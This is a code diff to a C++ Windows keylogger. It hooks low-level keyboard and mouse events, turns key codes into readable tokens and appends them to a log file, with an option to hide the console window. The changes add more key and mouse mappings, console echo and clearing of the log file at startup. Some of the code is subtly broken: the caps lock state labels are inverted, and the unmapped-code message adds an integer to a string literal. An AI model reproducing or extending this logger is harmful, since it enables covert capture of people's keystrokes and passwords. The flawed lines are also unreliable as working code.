@@ -2,10 +2,10 @@
 #include <fstream>
 #include <string>
 #include <iostream>
-#include <Windows.h>
+#include <windows.h>
 #include <stdio.h>
 
-#define HIDE_CONSOLE true
+#define HIDE_CONSOLE false
 #define OUTPUT_PATH "../Log.txt"
 
 using namespace std;
@@ -43,19 +43,20 @@ string getKeyString(DWORD vkCode)
 		return string(1, (char)vkCode);
 	}
 
-	else if (vkCode >= 0x60 && vkCode <= 0x69) // numpad numbers
+	else if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9) // numpad numbers
 	{
-		return to_string(vkCode - 0x60);
+		return to_string(vkCode - VK_NUMPAD0);
 	}
 
-	else if (vkCode >= 0x6A && vkCode <= 0x6F) // numpad numbers
+	else if (vkCode >= VK_MULTIPLY && vkCode <= VK_DIVIDE) // numpad numbers
 	{
 		return string(1, (char)(vkCode - 0x40));
 	}
 
-	else if (vkCode >= 0x70 && vkCode <= 0x7B) // F1 - F12.
+	else if (vkCode >= VK_F1 && vkCode <= VK_F12) // F1 - F12.
 	{
-		return  "[F" + to_string(vkCode - 111) + "]";
+		// Translate Fx to numerical component
+		return "[F" + to_string(vkCode - VK_F1 + 1) + "]";
 	}
 
 	else if (vkCode >= 0xBA && vkCode <= 0xC0)
@@ -87,47 +88,72 @@ string getKeyString(DWORD vkCode)
 	{
 		switch (vkCode)
 		{
-		case VK_LSHIFT:
-		case VK_RSHIFT:
-			break;
+		case VK_LSHIFT: return "<LSHIFT>";
+		case VK_RSHIFT: return "<RSHIFT>";
+
 		case VK_RETURN: return "<ENTER>";
-		case VK_CAPITAL: return "<CAPLOCK>";
+		case VK_CAPITAL: return string("<CAPLOCK; NOW ") + ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ? "OFF>" : "ON>");
+		case VK_NUMLOCK: return string("<NUMLOCK; NOW ") + ((GetKeyState(VK_NUMLOCK) & 0x0001) != 0 ? "OFF>" : "ON>");
+
 		case VK_LCONTROL: return "<LCTRL>";
 		case VK_RCONTROL: return "<RCTRL>";
+
 		case VK_INSERT: return "<INSERT>";
+
+		case VK_HOME: return "<HOME>";
 		case VK_END: return "<END>";
+
 		case VK_PRINT: return "<PRINT>";
 		case VK_DELETE: return "<DEL>";
+
 		case VK_BACK: return "<BK>";
 		case VK_LEFT: return "<LEFT>";
 		case VK_RIGHT: return "<RIGHT>";
 		case VK_UP: return "<UP>";
 		case VK_DOWN: return "<DOWN>";
+
 		case VK_SPACE: return " ";
 		case VK_ESCAPE: return "<ESC>";
 		case VK_TAB: return "<TAB>";
+
 		case VK_LWIN: return "<LWIN>";
 		case VK_RWIN: return "<RWIN>";
-		default: return "<Unmapped vk code: " + vkCode + '>';
 		}
 	}
-	return "<Unmapped vk code: " + vkCode + '>';
+	return "<UNMAPPED VK CODE: " + vkCode + '>';
 }
 
 string getMouseString(WPARAM wParam)
 {
 	switch (wParam)
 	{
-	case WM_LBUTTONDOWN: return "<LMOUSE>";
-	case WM_RBUTTONDOWN: return "<RMOUSE>";
+	case WM_LBUTTONDBLCLK:	return "<DBL LMOUSE>";
+	case WM_LBUTTONDOWN:	return "<LMOUSE>";
+
+	case WM_RBUTTONDBLCLK:	return "<DBL RMOUSE>";
+	case WM_RBUTTONDOWN:	return "<RMOUSE>";
+
+	case WM_MOUSEWHEEL:		return "<WHEEL>";
+	case WM_MBUTTONDOWN:	return "<CLICK WHEEL>";
 	}
 	return "";
 }
 
 void handleStream(string word)
 {
-	ofstream output_stream(OUTPUT_PATH, ios_base::app | ios_base::out);
-	output_stream << word;
+	if (word.length() > 0)
+	{
+		// Log to file
+		ofstream output_stream(OUTPUT_PATH, ios_base::app | ios_base::out);
+		output_stream << word;
+
+		// Log to console
+		if (!HIDE_CONSOLE)
+		{
+			cout << word << endl;
+
+		}
+	}
 }
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -153,6 +179,11 @@ LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 int main()
 {
+	// Clear the file
+	ofstream output_stream(OUTPUT_PATH, ios_base::out | ios_base::trunc);
+	output_stream.flush();
+	output_stream.close();
+
 	if (HIDE_CONSOLE)
 	{
 		ShowWindow(GetConsoleWindow(), SW_HIDE);
